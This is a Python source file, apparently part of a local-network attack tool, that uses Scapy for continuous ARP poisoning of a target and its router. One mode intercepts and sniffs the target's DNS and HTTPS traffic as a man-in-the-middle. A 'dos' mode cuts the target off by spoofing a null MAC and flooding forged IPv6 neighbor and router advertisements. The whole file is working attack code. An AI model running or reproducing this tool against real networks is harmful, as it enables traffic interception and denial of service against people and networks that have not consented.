import threading
import time
import socket
from scapy.all import Ether, ARP, sendp, sniff
from scapy.layers.inet6 import IPv6, ICMPv6ND_RA, ICMPv6ND_NA, ICMPv6NDOptDstLLAddr, ICMPv6EchoRequest, ICMPv6ND_RS
from host_gather import get_ip

stop_event = threading.Event()

def safe_send(packet, iface=None):
    #Wrapper for sendp to handle common socket errors.
    try:
        sendp(packet, iface=iface, verbose=0)
    except Exception as e:
        print(f"[!] Send Error: {e}")

def arp_poison_loop(target_ip, router_ip, dst_mac, spoof_mac):
    #Dedicated loop for ARP poisoning.
    packet = Ether(dst=dst_mac)/ARP(op=2, pdst=target_ip, psrc=router_ip, hwsrc=spoof_mac)
    while not stop_event.is_set():
        safe_send(packet)
        time.sleep(0.1)

def ipv6_poke():
    rs_packet = Ether()/IPv6(dst="ff02::2")/ICMPv6ND_RS()
    # Multicast Ping makes all nodes respond
    ping_packet = Ether()/IPv6(dst="ff02::1")/ICMPv6EchoRequest()

    safe_send(rs_packet)
    safe_send(ping_packet)

def ipv6_poison_service(target_mac):

    #Handles discovery and then switches to the poisoning loop.

    target_v6, router_v6 = None, None
    ipv6_poke()
    def find_ips(pkt):
        nonlocal target_v6, router_v6
        if IPv6 in pkt:
            if pkt.haslayer(ICMPv6ND_RA):
                router_v6 = pkt[IPv6].src
            if pkt.src == target_mac:
                target_v6 = pkt[IPv6].src

    # Discovery phase
    print("Discovering IPv6 Link-Local addresses...")
    sniff(filter="ip6", prn=find_ips, timeout=20, stop_filter=lambda x: target_v6 and router_v6)

    if not target_v6 or not router_v6:
        print("IPv6 Discovery Failed. Router/Target are being too quiet!")
        return

    print(f"IPv6 DOS Engaged: Target {target_v6} | Router {router_v6}")

    # Build the Blackhole Packets
    na_packet = Ether(dst=target_mac)/IPv6(src=router_v6, dst=target_v6)/ \
                ICMPv6ND_NA(tgt=router_v6, R=1, S=1, O=1)/ \
                ICMPv6NDOptDstLLAddr(lladdr="00:00:00:00:00:00")

    ra_kill = Ether(dst="33:33:00:00:00:01")/IPv6(dst="ff02::1")/ICMPv6ND_RA(routerlifetime=0)

    while not stop_event.is_set():
        safe_send(na_packet)
        safe_send(ra_kill)
        time.sleep(0.1)

def start_arp_poison(target_ip, target_mac, router_ip, attacker_mac, router_mac, dos):
    stop_event.clear()
    threads = []

    #Target poisonong
    address = "00:00:00:00:00:00" if dos else attacker_mac
    target_thread = threading.Thread(target=arp_poison_loop, args=(target_ip, router_ip, target_mac, address), daemon=True)
    threads.append(target_thread)

    #Router Poisoning
    router_thread = threading.Thread(target=arp_poison_loop, args=(router_ip, target_ip, router_mac, attacker_mac), daemon=True)
    threads.append(router_thread)

    #IPv6 Poisoning
    if dos:
        print("Starting IPv6 poisoning...")
        ipv6_thread = threading.Thread(target=ipv6_poison_service, args=(target_mac,), daemon=True)
        threads.append(ipv6_thread)

    #Traffic Sniffer
    if not dos:
        from scanner import process_packet
        try:
            my_ip = get_ip()
            my_filter = f"not host {my_ip} and (udp port 53 or tcp port 443)"
        except Exception:
            my_filter = "(udp port 53 or tcp port 443)"

        sniff_thread = threading.Thread(target=lambda: sniff(prn=process_packet, filter=my_filter, store=0), daemon=True)
        threads.append(sniff_thread)

    for thread in threads:
        thread.start()
